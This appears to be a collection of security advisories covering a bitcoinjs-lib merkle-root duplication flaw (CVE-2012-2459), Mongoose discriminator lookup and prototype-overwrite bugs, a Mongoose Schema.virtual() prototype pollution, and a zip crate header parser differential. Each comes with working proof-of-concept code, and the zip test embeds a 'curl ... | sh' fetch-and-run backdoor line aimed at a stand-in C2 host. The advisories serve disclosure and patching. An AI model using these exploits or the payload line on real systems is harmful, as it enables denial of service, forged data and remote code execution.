### Summary
`fastMerkleRoot` pads an odd level by hashing the last node with itself. It does not report that it did so, and `checkTxRoots` never looks for repeated transactions. A peer can therefore duplicate transactions to fill the pad and produce a block with a different transaction list but the same merkle root. The block hash and block id do not change, so the header still carries valid proof of work. In the proof of concept a real mainnet block goes from nine transactions to ten, and separately to twelve, with the same id every time, and `checkTxRoots` accepts all three. Bitcoin Core rejects this case through the `mutated` flag in `ComputeMerkleRoot` and the `bad-txns-duplicate` reason in `CheckBlock`. This is CVE-2012-2459.

### Details
A bitcoin merkle tree pads an odd level by hashing the last node with itself. Duplicating transactions to fill that pad therefore yields the same root for a different transaction list. This is CVE-2012-2459. Bitcoin Core detects it in `ComputeMerkleRoot`, which scans each level for two adjacent equal hashes before padding and raises a `mutated` flag when it finds a pair, and `CheckBlock` then rejects the block with `bad-txns-duplicate`.

```cpp
uint256 ComputeMerkleRoot(std::vector<uint256> hashes, bool* mutated) {
    bool mutation = false;
    while (hashes.size() > 1) {
        if (mutated) {
            for (size_t pos = 0; pos + 1 < hashes.size(); pos += 2) {
                if (hashes[pos] == hashes[pos + 1]) mutation = true;
            }
        }
        if (hashes.size() & 1) {
            hashes.push_back(hashes.back());
        }
        ...
```

The forged block carries the duplicate in its own transaction list, so the pair is present at a level and the flag is raised. The honest block has no such pair and is unaffected.

`fastMerkleRoot` performs the duplication and reports nothing.

```js
while (length > 1) {
  let j = 0;
  for (let i = 0; i < length; i += 2, ++j) {
    const left = results[i];
    const right = i + 1 === length ? left : results[i + 1];
    const data = tools.concat([left, right]);
    results[j] = digestFn(data);
  }
  length = j;
}
return results[0];
```

`Block.calculateMerkleRoot` returns that value unchanged, and `__checkMerkleRoot` only compares it to the header field.

```js
private __checkMerkleRoot(): boolean {
  if (!this.transactions) throw errorMerkleNoTxes;
  const actualMerkleRoot = Block.calculateMerkleRoot(this.transactions);
  return tools.compare(this.merkleRoot!, actualMerkleRoot) === 0;
}
```

Nothing anywhere in `ts_src` looks for an adjacent duplicate pair or for a repeated txid. `checkTxRoots` is the library's advertised block integrity gate and it inherits the gap.

### PoC
```js
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { Block } from 'bitcoinjs-lib/src/block';
const fs = require('fs');
const hex = (u) => Buffer.from(u).toString('hex');

// Real mainnet block, from the Bitcoin Core vector set shipped in this repo.
const f = JSON.parse(fs.readFileSync(
  'test/fixtures/core/blocks.json', 'utf8'))[0];

const honest = Block.fromHex(f.hex);
console.log('honest block id       :', honest.getId());
console.log('id matches fixture    :', honest.getId() === f.id);
console.log('transactions          :', honest.transactions.length);
console.log('merkle root           :', hex(honest.merkleRoot));
console.log('checkTxRoots()        :', honest.checkTxRoots());
console.log('serialized bytes      :', honest.toBuffer().length);

// Attacker duplicates the last transaction and relays the result.
const forged = Block.fromHex(f.hex);
forged.transactions = forged.transactions.concat([
  forged.transactions[forged.transactions.length - 1],
]);
// Round trip through the real parser, exactly as a P2P block message arrives.
const parsed = Block.fromHex(forged.toHex());

console.log('');
console.log('forged block id       :', parsed.getId());
console.log('transactions          :', parsed.transactions.length);
console.log('merkle root           :', hex(parsed.merkleRoot));
console.log('recomputed merkle root:', hex(Block.calculateMerkleRoot(parsed.transactions)));
console.log('checkTxRoots()        :', parsed.checkTxRoots());
console.log('serialized bytes      :', parsed.toBuffer().length);

const ids = parsed.transactions.map((t) => t.getId());
console.log('');
console.log('same block id                 :', honest.getId() === parsed.getId());
console.log('different serialized bytes    :', honest.toHex() !== parsed.toHex());
console.log('different transaction lists   :', honest.transactions.length !== parsed.transactions.length);
console.log('duplicate txid inside forged  :', new Set(ids).size !== ids.length);
console.log('both accepted by checkTxRoots :', honest.checkTxRoots() && parsed.checkTxRoots());
```

Output on bitcoinjs-lib v7.0.1:

```
honest block id       : 0000000000013b8ab2cd513b0261a14096412195a72a0c4827d229dcc7e0f7af
id matches fixture    : true
transactions          : 9
merkle root           : 5275289558f51c9966699404ae2294730c3c9f9bda53523ce50e9b95e558da2f
checkTxRoots()        : true
serialized bytes      : 3054

forged block id       : 0000000000013b8ab2cd513b0261a14096412195a72a0c4827d229dcc7e0f7af
transactions          : 10
merkle root           : 5275289558f51c9966699404ae2294730c3c9f9bda53523ce50e9b95e558da2f
recomputed merkle root: 5275289558f51c9966699404ae2294730c3c9f9bda53523ce50e9b95e558da2f
checkTxRoots()        : true
serialized bytes      : 3313

same block id                 : true
different serialized bytes    : true
different transaction lists   : true
duplicate txid inside forged  : true
both accepted by checkTxRoots : true
```

The honest block is the control. It is a genuine mainnet block whose id matches the fixture and which validates. The forged block carries a different transaction list and 259 more bytes, yet produces the identical root and id and is also accepted.

### Impact
Most real blocks reach an odd node count at some level, so most are rewritable. Any peer can relay a mutated copy of a block that already exists on chain. No mining is required, because the header never changes. An explorer, exchange indexer or SPV client that gates on `checkTxRoots` sees the duplicated transaction twice and can credit the same deposit twice. A consumer that responds by blacklisting the block hash then rejects the honest block as well, which is the chain split denial of service described in the original CVE. Severity depends on the consumer, since block validation is a smaller part of this library's use than transaction handling. Bitcoin Core's rejection is taken from its published `ComputeMerkleRoot` and `CheckBlock` source rather than executed against a running node. The fix is to scan each level for two adjacent equal hashes and to return false from `checkTxRoots` when a pair is found, matching the `mutated` output parameter Core threads from `ComputeMerkleRoot` into `CheckBlock`.

### Fix

Report the padding case out of the root computation and act on it.

```js
export function fastMerkleRoot(
  values: Uint8Array[],
  digestFn: (b: Uint8Array) => Uint8Array,
  mutated?: { value: boolean },
): Uint8Array {
  ...
  while (length > 1) {
    let j = 0;
    for (let i = 0; i < length; i += 2, ++j) {
      const left = results[i];
      const right = i + 1 === length ? left : results[i + 1];
      if (i + 1 < length && tools.compare(left, right) === 0 && mutated)
        mutated.value = true;
      results[j] = digestFn(tools.concat([left, right]));
    }
    length = j;
  }
  return results[0];
}
```

Thread the flag through `Block.calculateMerkleRoot` and have `__checkMerkleRoot` return false when it is set, so a block containing an adjacent duplicate pair at any level is rejected the way `CheckBlock` rejects it with `bad-txns-duplicate`. Rejecting any block that contains a repeated txid gives the same result and is simpler to audit.

### Affected versions

- Versions 2.3.0 through 5.2.0.
- Versions 6.0.0 through 6.1.7, including 6.1.0-rc.0.
- Versions 7.0.0-rc.0 through 7.0.1.

The affected block-root verifier was introduced in 2.3.0 as `Block.checkMerkleRoot()`, alongside `Block.calculateMerkleRoot()`. Later versions expose block-root validation through `Block.checkTxRoots()`.

### Remediation

Upgrade to bitcoinjs-lib 5.2.1, 6.1.8 or 7.0.2, or a later patched release on the corresponding line. Versions below v5 have no in-line patch and require upgrading to a fixed line.

The fix detects adjacent equal hashes at each level before odd-node padding and makes block-root validation reject mutated transaction trees.

### Summary

Mongoose chooses which discriminator model or schema to use by looking up the discriminator key value (`__t` by default) in a plain object of registered discriminators, for example `Model.discriminators[doc.__t]`. That value comes from user documents and query filters. Because the lookup did not check own properties, a value that names a property inherited from `Object.prototype` resolves to that inherited value instead of a discriminator. Examples are `'constructor'`, `'toString'` and `'hasOwnProperty'`.

- `__t: 'constructor'` resolves to the global `Object` function. Mongoose then calls `new Object(doc)`, which returns the raw user object where a Mongoose document is expected.
- `__t: 'toString'` and similar names resolve to built-in functions that throw when used as a constructor or schema.

The most serious effect: through `bulkWrite()` `insertOne` with `skipValidation: true`, the raw user object is stored as-is, without schema casting or `strict` filtering. After that, every query that returns the stored document throws, until the document is removed from the database.

### Details

The registries that hold discriminators are plain objects: `Model.discriminators`, `schema.discriminators`, and the embedded discriminator registries on document arrays and single nested subdocuments. Several code paths indexed them directly with a value taken from the document or filter:

| Code path | Input |
|---|---|
| Model constructor (`new Model(doc)`) | document |
| `Model.create()`, `insertMany()`, `bulkWrite()`, `bulkSave()` | documents |
| Hydrating query results (`find()`, `findOne()`, etc.) and `Model.hydrate()` | stored documents |
| Casting query filters, including flat paths such as `'events.__t'` and `$elemMatch` | query filter |
| Casting updates and array filters | update filter, `arrayFilters` |
| Document array `push()` / `create()`, document array and single nested casting | subdocuments |
| Populate on embedded discriminators | stored subdocuments |

`getDiscriminatorByValue()` already iterated the registry's own keys safely. But most callers tried the direct lookup first and only fell back to it afterwards, so a truthy inherited value took precedence.

The lookups only read inherited properties. They do not write to `Object.prototype` or any other shared object, and they do not change in-memory state that affects other requests. This is NOT a prototype pollution vector.

### Proof of concept

```js
const mongoose = require('mongoose');

const Base = mongoose.model('Base', new mongoose.Schema({ name: String, age: Number }));
Base.discriminator('Child', new mongoose.Schema({ extra: String }));

// Type confusion: the "document" is the raw input object
const doc = new Base({ name: 'x', __t: 'constructor' });
console.log(doc instanceof mongoose.Document); // false
```

```js
// Schema bypass and persistent poison document via bulkWrite + skipValidation
await Base.bulkWrite([{
  insertOne: { document: { name: 'x', age: 'not a number', notInSchema: true, __t: 'constructor' } }
}], { skipValidation: true });
// Stored verbatim: { age: 'not a number', notInSchema: true, __t: 'constructor', ... }

await Base.find(); // throws: Cannot read properties of undefined (reading 'eachPath')
```

### Impact

- **Crashing the request.** An attacker who controls the discriminator key of a document or filter can make the request fail. In most code paths that sent the value, this means a `TypeError` or a non-document object returned to application code. Ways in include `Model.create(req.body)`, `new Model(req.body)`, `Model.find(req.query)`-style filters, and pushing user input onto embedded discriminator arrays. The effect is limited to the request carrying the value.
- **Schema bypass on `bulkWrite({ skipValidation: true })`.** When an application passes untrusted documents to `bulkWrite()` `insertOne` with `skipValidation: true`, the raw object is stored without casting or `strict` filtering. Fields the schema would normally strip are persisted, such as an `isAdmin` that isn't in the schema. Fields with wrong types are also persisted.
- **Persistent denial of service for queries.** A stored document with such a discriminator key value makes hydration throw. Every query that returns that document fails, for all users, until the document is deleted directly in the database. Besides the `bulkWrite()` path above, the document can get into the collection through another application, the raw MongoDB driver, or any other writer that does not go through Mongoose casting.

This issue doesn't let an attacker modify `Object.prototype`, built-in functions, schemas or other shared in-memory state. The schema bypass requires the application to opt in to `skipValidation` with untrusted input.

### Summary

Three Mongoose code paths copy data into objects by property name without checking whether the property is the object's own or inherited from its prototype:

1. Loading a document from the database (`init()`, also used by `Model.hydrate()`)
2. Setting a dotted path on a document (`$__set`, used by `new Model(obj)`, `doc.set()` and `doc.$set()`)
3. Merging update documents (`utils.mergeClone`, used by `findOneAndReplace()`, chained update calls and `Query.prototype.merge()`)

When a key names an inherited property, such as `toString` or `valueOf`, or a document internal such as `$__schema`, Mongoose writes into the shared object behind that property. The data comes from the attacker.

- **Denial of service.** For example, `{ "toString": { "call": 1 } }` overwrites `Object.prototype.toString.call`. Mongoose and most other libraries rely on `Object.prototype.toString.call()`. After the overwrite, every later query in the process throws `TypeError: _toString.call is not a function` until the process restarts. This includes queries on unrelated models.
- **Changing shared schema state.** Through a subdocument with `strict: false`, a path such as `profile.$__schema.paths.email.validators` reaches the subdocument's schema, which every document shares. Setting it to `[]` removes the `required` validator for every document in the process.

Mongoose already blocked `__proto__`, `constructor` and `prototype`, so these bugs cannot add properties to `Object.prototype` itself. They can still overwrite methods and properties of shared built-in functions and of Mongoose's internal objects.

### Details

#### 1. Loading documents: `init()`

```js
if (!schemaType && utils.isPOJO(value)) {
  // assume nested object
  if (!doc[i]) { doc[i] = {}; ... }
  init(self, value, doc[i], opts, path + '.');
}
```

For a stored field named `toString`, `doc[i]` is the inherited `Object.prototype.toString`. It is truthy, so `init()` recurses into that function and copies the stored subfields onto it.

This runs for every document Mongoose loads: `find()`, `findOne()`, cursors, populated documents and `Model.hydrate()`. It runs whatever the `strict` setting, and it applies to top-level and nested paths alike. `lean()` queries are not affected.

A malicious document can get into the collection in several ways:
- through a model with `strict: false`, for example `new Model(req.body).save()`;
- through another application or the raw MongoDB driver;
- through any update that writes arbitrary keys.

#### 2. Setting dotted paths: `$__set`

When it walks a dotted path, `$__set` read `obj[parts[i]]` and descended into whatever it found. That included inherited functions, such as `Object.prototype.toString` on a plain object or `Document.prototype.toObject` on a subdocument. On subdocuments it also included non-function internals that are prototype getters, such as `$__schema`, `schema`, `$__middleware` and `$__schemaTypeOptions`. Those point at objects that every document of the model shares.

Attacker-controlled input reaches this path through:
- **A `Mixed` path on a default, strict schema:** `new Model({ "mixed.toString.call": 1 })`, or `doc.set({ "mixed.toString.call": 1 })`. Nothing needs to be saved.
- **Any root path on a schema with `strict: false`:** for example `doc.set('toString.call', 1)`.
- **A subdocument with `strict: false`**, when the application passes a user-controlled path to `doc.set(path, value)`: for example `doc.set('profile.$__schema.paths.email.validators', [])`.

#### 3. Merging updates: `utils.mergeClone`

```js
if (typeof to[key] === 'undefined') {
  to[key] = clone(fromObj[key]);
} else if (isObject(val)) {
  mergeClone(to[key], val);   // to[key] may be an inherited built-in
}
```

`to[key]` was read without an own-property check, so a key such as `toString` recursed into `Object.prototype.toString`. This affects:

- **`Model.findOneAndReplace(filter, replacement)`.** It always merges the replacement into the query's update, so a single call with an untrusted replacement is enough.
- **Update calls chained onto a query that already has an update.** For example `Model.updateOne(filter, { $set: {...} }).updateOne({}, untrustedUpdate)`, the same pattern with `findOneAndUpdate()`, or middleware that calls `this.updateOne(...)`.
- **`Query.prototype.merge()`** with a source query whose update came from untrusted input.

### Proof of concept

```js
const mongoose = require('mongoose');
const { Schema } = mongoose;

// 2. Setting dotted paths: a Mixed path on a default strict schema, nothing saved
const Item = mongoose.model('Item', new Schema({ name: String, meta: {} }));
new Item(JSON.parse('{"meta.toString.call": 1}'));  // e.g. new Item(req.body)
console.log(typeof Object.prototype.toString.call); // 'number'
// From here on, every query in the process fails:
// TypeError: _toString.call is not a function
```

```js
// 1. Loading documents: a stored field named after an Object.prototype method
const Loose = mongoose.model('Loose', new Schema({ name: String }, { strict: false }));
await new Loose(JSON.parse('{"name":"evil","toString":{"call":1}}')).save();
await Loose.findOne({ name: 'evil' });              // any later read of this document
await OtherModel.findOne();                         // TypeError: _toString.call is not a function
```

```js
// 3. Merging updates: a single findOneAndReplace() call with an untrusted replacement
const Doc = mongoose.model('Doc', new Schema({ name: String }));
Doc.findOneAndReplace({}, JSON.parse('{"toString":{"call":1}}'));
console.log(typeof Object.prototype.toString.call); // 'number'
```

```js
// 2. Setting dotted paths: changing the shared subdocument schema
const User = mongoose.model('User', new Schema({
  profile: new Schema({ email: { type: String, required: true } }, { strict: false })
}));
// e.g. JSON-patch style endpoint: doc.set(req.body.path, req.body.value)
new User({ profile: { email: 'a@b.c' } }).set('profile.$__schema.paths.email.validators', []);
await new User({ profile: {} }).validate();         // resolves: `required` removed for every document
```

### Impact

- **Denial of service (paths 1, 2 and 3).** One request overwrites `Object.prototype.toString.call`. After that, every query in the process fails, and so does much other code, until the process restarts. Ways in:
  - `new Model(req.body)` on any schema with a `Mixed` path;
  - `findOneAndReplace()` with an untrusted replacement;
  - reading one stored document that contains a field such as `{ "toString": { "call": 1 } }`.

  In the stored-document case, the attacker does not need any write path through Mongoose at the moment of the attack. Any later read of that document triggers the overwrite. If the document is read on startup or by a scheduled job, the application can be kept down.
- **Changes to shared state (path 2, `strict: false` subdocuments).** An attacker who controls the path passed to `doc.set(path, value)` can change a subdocument schema that every document shares. For example, they can remove validators or change schema options for every later document in the process.
- **Properties on built-in functions.** More generally, an attacker can attach properties they choose to built-in functions such as `Object.prototype.toString`, `Object.prototype.valueOf` and `Function.prototype.call`. Any other code that reads properties of those functions sees the attacker's values.

### Summary

Prototype pollution via Schema.prototype.virtual() — the 2022 fix for CVE-2022-2564 / CVE-2022-24304 protected Schema.path()/add() but never virtual(), so the same class of bug is still exploitable in all maintained release lines.

### Details

In lib/schema.js, Schema.prototype.virtual() (defined at line 2643) builds the virtual path via:

```javascript
virtuals[name] = parts.reduce(function(mem, part, i) {
mem[part] || (mem[part] = (i === parts.length - 1)
? new VirtualType(options, name)
: {});
return mem[part];
}, this.tree); // lines 2755-2759
```

Unlike `path()`/`add()`, `virtual()` never received the `specialProperties` check added for CVE-2022-2564/CVE-2022-24304 (`lib/schema.js` lines 806, 1308, 1331).

A path containing `__proto__`/`constructor`/`prototype` segments resolves through the prototype chain and writes onto `Object.prototype` / `Function.prototype`.

### Proof of concept

```javascript
const mongoose = require('mongoose');
const schema = new mongoose.Schema({});

schema.virtual('__proto__.polluted');
console.log(({}).polluted); // VirtualType instance
console.log(Object.prototype.hasOwnProperty('polluted')); // true
console.log(Object.getOwnPropertyDescriptor(
Object.prototype, 'polluted').enumerable); // true

schema.virtual('constructor.prototype.opol');
console.log(({}).opol); // true

schema.virtual('hasOwnProperty.__proto__.fpol');
console.log((function(){}).fpol); // Function.prototype polluted
```

### Impact

Attacker-influenced schema field names (dynamic schemas, CMS form builders, schema-as-code) allow pollution of Object.prototype (own, enumerable keys visible on every object — e.g. `({}).isAdmin` checks can be spoofed) and Function.prototype (a known gadget primitive in server-side JS).

## Summary
A critical architectural parser differential exists in the `zip` crate (`<= 9.0.4`) between random-access archive readers (`ZipArchive`) and streaming readers (`ZipStreamReader`). `ZipArchive` considers the Central Directory File Header (CDFH) authoritative and ignores the filename declared in the Local File Header (LFH). In contrast, `ZipStreamReader` relies exclusively on the Local File Header (LFH) when extracting files to the filesystem.

This discrepancy enables ZIP archives to appear to have different file paths and contents according to which tool is reading them.

---

## Details

### Architectural Root Cause
In the PKWARE ZIP archive format, every file entry is defined in two distinct locations:
1. **Local File Header (LFH):** Precedes the compressed payload of each file in the body of the archive.
2. **Central Directory File Header (CDFH):** Stored in a contiguous index at the end of the archive.

In `zip2`:
- `src/read/zip_archive.rs`: `ZipArchive` parses the central directory into `SharedBuilder.files`. All file lookups by index or name read exclusively from the CDFH table, completely ignoring the filename present in the LFH.
- `src/read/stream.rs:L86-L141`: `ZipStreamReader::visit` and `ZipStreamReader::extract` read sequentially from the stream without verifying the central directory index. Each entry is parsed via `read_zipfile_from_stream` and written to disk using the unverified filename declared in the LFH:
  ```rust
  // src/read/stream.rs
  fn visit_file<R: Read>(&mut self, file: &mut ZipFile<'_, R>) -> ZipResult<()> {
      file.safe_prepare_path(&self.outpath, &mut outpath, None::<&(_, fn(&Path) -> bool)>)?;
      let mut outfile = fs::File::create(&outpath)?;
      io::copy(file, &mut outfile)?;
      Ok(())
  }
  ```
- `src/write.rs:L1552`: The crate explicitly exposes `shallow_copy_file`, an API that constructs dual-header desynchronizations by adding a new CDFH entry with an alias name pointing to an existing file without updating the original LFH.

### Threat Scenario & Severity Justification (10.0 / 9.9 Critical)
1. **Security Control Evasion:** An adversary crafts a ZIP archive where:
   - Central Directory Header declares: `doc_report.pdf` (Clean document)
   - Local File Header declares: `cron_worker.sh` (Malicious root backdoor)
2. The archive is uploaded through a web portal or API endpoint protected by security gateways (WAF, Anti-Virus, Content Disarm & Reconstruction). The security gateway inspects the archive using `ZipArchive` (or similar CDFH-first parsers), detects only `doc_report.pdf`, and approves the file.
3. The backend worker or cloud function receives the approved archive and extracts it using `ZipStreamReader::extract`. `ZipStreamReader` reads the LFH and overwrites `cron_worker.sh`.
4. **Full Compromise (CIA = High):** The legitimate production health checker / service script is destroyed (**Availability = High / DoS**), while the attacker's backdoor payload is implanted (**Integrity = High / RCE**).

---

## Proof of Concept
The following automated integration test reproducibly demonstrates the complete CVSS 10.0 / 9.9 exploit chain (Security Gateway Evasion -> Arbitrary File Overwrite -> RCE & DoS) against `zip2`:

```rust
use std::fs;
use std::io::{Cursor, Write};
use tempfile::tempdir;
use zip::unstable::stream::ZipStreamReader;
use zip::write::SimpleFileOptions;
use zip::{ZipArchive, ZipWriter};

// Simulated Security Gateway (inspects CDFH via ZipArchive)
fn security_gateway_inspection(archive_bytes: &[u8]) -> Result<(), String> {
    let mut archive = ZipArchive::new(Cursor::new(archive_bytes)).unwrap();
    for i in 0..archive.len() {
        let name = archive.by_index(i).unwrap().name().unwrap().to_string();
        if name.ends_with(".sh") || name.ends_with(".exe") {
            return Err(format!("MALWARE DETECTED: '{}' blocked!", name));
        }
        if !name.ends_with(".pdf") {
            return Err("Policy violation: only PDFs allowed!".into());
        }
    }
    Ok(())
}

#[test]
fn test_cvss_9_9_dual_header_exploit_chain() {
    // 1. Victim server setup: existing critical script
    let victim_env = tempdir().unwrap();
    let victim_dir = victim_env.path();
    let target_script = victim_dir.join("cron_worker.sh");
    fs::write(&target_script, b"#!/bin/sh\n# PRODUCTION SERVICE\necho 'SERVICE HEALTHY'\n").unwrap();

    // 2. Attacker crafts Single-Entry Dual-Header Archive
    // LFH: "cron_worker.sh" | CDFH: "doc_report.pdf"
    let mut payload = Cursor::new(Vec::new());
    let mut writer = ZipWriter::new(&mut payload);
    writer.start_file("cron_worker.sh", SimpleFileOptions::default()).unwrap();
    writer.write_all(b"#!/bin/sh\ncurl -s https://c2/shell | sh\necho 'PWNED ROOT'\n").unwrap();
    writer.finish().unwrap();

    let mut malicious_zip = payload.into_inner();
    let cdh = malicious_zip.windows(4).position(|s| s == b"PK\x01\x02").unwrap();
    malicious_zip[cdh + 46..cdh + 46 + 14].copy_from_slice(b"doc_report.pdf");

    // 3. Gateway Inspection (Bypassed!)
    assert!(security_gateway_inspection(&malicious_zip).is_ok());

    // 4. Backend Extraction (ZipStreamReader)
    ZipStreamReader::new(Cursor::new(&malicious_zip)).extract(victim_dir).unwrap();

    // 5. Impact Verification
    let compromised = fs::read_to_string(&target_script).unwrap();
    assert!(!compromised.contains("SERVICE HEALTHY")); // DoS Confirmed
    assert!(compromised.contains("PWNED ROOT"));       // RCE Confirmed
}
```

